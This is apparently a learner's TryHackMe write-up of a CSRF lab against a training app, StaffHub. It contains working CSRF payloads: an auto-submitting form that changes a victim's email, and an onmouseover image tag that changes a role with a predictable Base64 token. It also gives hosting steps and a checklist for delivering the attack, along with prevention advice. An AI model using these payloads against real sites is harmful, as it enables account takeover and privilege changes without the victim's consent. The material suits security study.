# TryHackMe — CSRF Introduction

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat&logo=tryhackme&logoColor=white)
![Path](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red)
![Topic](https://img.shields.io/badge/Topic-CSRF-orange)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Date](https://img.shields.io/badge/Completed-June%202026-purple)

---

## Overview

| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Room | CSRF Introduction |
| Path | Jr Penetration Tester → Web Application Vulnerabilities I |
| Target App | StaffHub (`staffhub.thm:8080`) |
| Tasks Completed | Task 1 — Task 8 (all) |
| Date Completed | June 2026 |

---

## Tasks Completed

| Task | Topic | Status |
|------|-------|--------|
| Task 1 | Introduction | ✅ Done |
| Task 2 | What is CSRF | ✅ Done |
| Task 3 | Why CSRF Works | ✅ Done |
| Task 4 | Finding CSRF Vulnerabilities | ✅ Done |
| Task 5 | Exploitation using HTML Form | ✅ Done |
| Task 6 | Exploitation over Weak Tokens | ✅ Done |
| Task 7 | Best Practices | ✅ Done |
| Task 8 | Conclusion | ✅ Done |

---

## What is CSRF?

**One-line definition:**
> CSRF is an attack where a victim's authenticated browser is tricked into sending unintended requests to a trusted application without their consent.

**Why it works:**
Browsers automatically attach session cookies and authentication tokens to every request made to a domain. The server receives the request and thinks:
> *"This request is coming from a legitimate logged-in user"*

It cannot distinguish a request the user intentionally made from one forged by an attacker's page.

---

## Vulnerability Types Encountered

### Case 1 — No CSRF Protection
- No token present anywhere in the request
- Request is fully forgeable with a simple HTML form
- Server accepts any POST request with valid session cookie

### Case 2 — Weak CSRF Token
- Token exists but is predictable
- Token was Base64-encoded role value (`YWRtaW4=` = `admin`)
- Easily decoded, reconstructed, and reused by attacker

### Case 3 — Poor Token Validation
- Token present but server does not validate it properly
- Server does not check request origin
- Submitting with wrong or missing token still succeeds

---

## Target Actions Identified

The vulnerable app (`staffhub.thm:8080`) exposed two state-changing actions — perfect CSRF targets:

| Action | Endpoint | Method | Why it's a CSRF target |
|--------|----------|--------|----------------------|
| Update Email | `/update_email.php` | POST | Changes account email — account takeover vector |
| Update Role | `/update_role.php` | GET | Changes user privilege level — privilege escalation |

**Rule:** Any state-changing action (data modification, privilege change, account setting) with no unpredictable token is a CSRF target.

---

## Attack Flow

### Step 1 — Identify Target Action
Located state-changing endpoints:
- `POST /update_email.php`
- `GET /update_role.php`

Confirmed no proper validation — either no token or a predictable Base64 token.

### Step 2 — Analyse the Request
Intercepted the legitimate request in Burp Suite:
- Observed parameters: `email=` or `role=` + `csrf_token=`
- Decoded the token: `YWRtaW4=` → `admin` (Base64)
- Confirmed token was not tied to session — same value every time

### Step 3 — Build the Malicious Page

**Email CSRF — form-based:**
```html
<form action="http://staffhub.thm:8080/update_email.php" method="POST">
  <input type="hidden" name="email" value="attacker@evilmail.thm">
</form>
<script>document.forms[0].submit()</script>
```
Auto-submits on page load — victim sees nothing.

**Role CSRF — image/mouseover based (GET request):**
```html
<img onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='">
```
Triggers on mouse hover — exploits GET-based state change.

### Step 4 — Host the Attacker Page

Created the payload file:
```bash
sudo nano /var/www/html/poc.html
```

Served via Python HTTP server:
```bash
python3 -m http.server 8081
```

Or via Apache (already running):
```
http://<ATTACKER_IP>:8081/poc.html
```

Payload file stored at:
```bash
/var/www/html/role.html
```

### Step 5 — Social Engineering
Victim condition:
- Already logged in to `staffhub.thm:8080`
- Opens attacker link (phishing email, malicious ad, any external page)

### Step 6 — Execution
Browser automatically:
1. Sends forged request to StaffHub
2. Includes victim's session cookie
3. Server processes request as if victim initiated it

### Step 7 — Result
- Email changed to `attacker@evilmail.thm` **OR**
- Role downgraded from admin to staff
- Flag appeared in the StaffHub dashboard

---

## Reproduction Checklist

```
[ ] 1. Confirm victim is logged in to target app
[ ] 2. Identify state-changing action (email, role, password)
[ ] 3. Intercept request — check for CSRF token
[ ] 4. Test token: remove it → does request still work?
[ ] 5. Test token: decode it (Base64?) → is it predictable?
[ ] 6. Build payload HTML matching the endpoint + parameters
[ ] 7. Host payload on attacker server (python3 -m http.server 8081)
[ ] 8. Deliver link to victim (social engineering)
[ ] 9. Confirm state change occurred on victim account
[ ] 10. Document: endpoint, method, payload used, result
```

---

## Key Takeaways

- **CSRF works because cookies are automatic.** The browser does not ask permission before sending cookies — that is by design, and CSRF abuses it
- **GET requests should never change state.** `update_role.php?role=staff` via GET is exploitable with a single image tag — no form needed
- **Predictable tokens are not tokens.** Base64-encoding a role name is not a security measure — it is obfuscation that fails in seconds
- **Automated scanners miss logic flaws.** Burp's active scanner would find the missing token, but the weak token case requires manual analysis and decoding
- **SameSite cookie attribute is the modern fix.** `SameSite=Strict` would have blocked every attack in this room — the browser simply refuses to send the cookie on cross-origin requests

---

## Attack Types Used

| Attack type | Technique | Endpoint |
|-------------|-----------|----------|
| Form-based CSRF | Auto-submit hidden form | POST `/update_email.php` |
| Image-based CSRF | `onmouseover` trigger | GET `/update_role.php` |
| GET request manipulation | Direct URL parameter | GET `/update_role.php?role=staff` |

---

## Prevention

| Defence | Why it works |
|---------|-------------|
| `SameSite=Strict` cookie | Browser refuses to send cookie on cross-origin requests — blocks all CSRF |
| Unpredictable CSRF token | Attacker cannot forge a request without knowing the random token |
| Token tied to session | Stolen token from one session cannot be used in another |
| Re-authentication for sensitive actions | Password prompt before email/role changes stops CSRF even if token is bypassed |
| Validate `Origin` / `Referer` header | Reject requests not originating from the expected domain |

---

## Connection to PortSwigger Labs

| This Room | PortSwigger Equivalent |
|-----------|----------------------|
| No CSRF protection | Lab: CSRF vulnerability with no defences |
| Weak token (Base64) | Lab: CSRF where token is not unpredictable |
| Poor validation | Lab: CSRF where token validation depends on request method |

---

## Resources

- [PortSwigger CSRF Labs](https://portswigger.net/web-security/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings — CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)

---

## My Progress

- [x] Guided Pentest: Web Application
- [x] Guided Pentest: Infrastructure
- [x] SQL Injection
- [x] CSRF Introduction ← *this writeup*
- [x] Nmap Live Host Discovery
- [x] Nmap Basic Port Scans
- [ ] XSS, Authentication, Access Control — coming next

---

*Part of my 6-month cybersecurity portfolio — [github.com/shehrozmajeed](https://github.com/shehrozmajeed)*
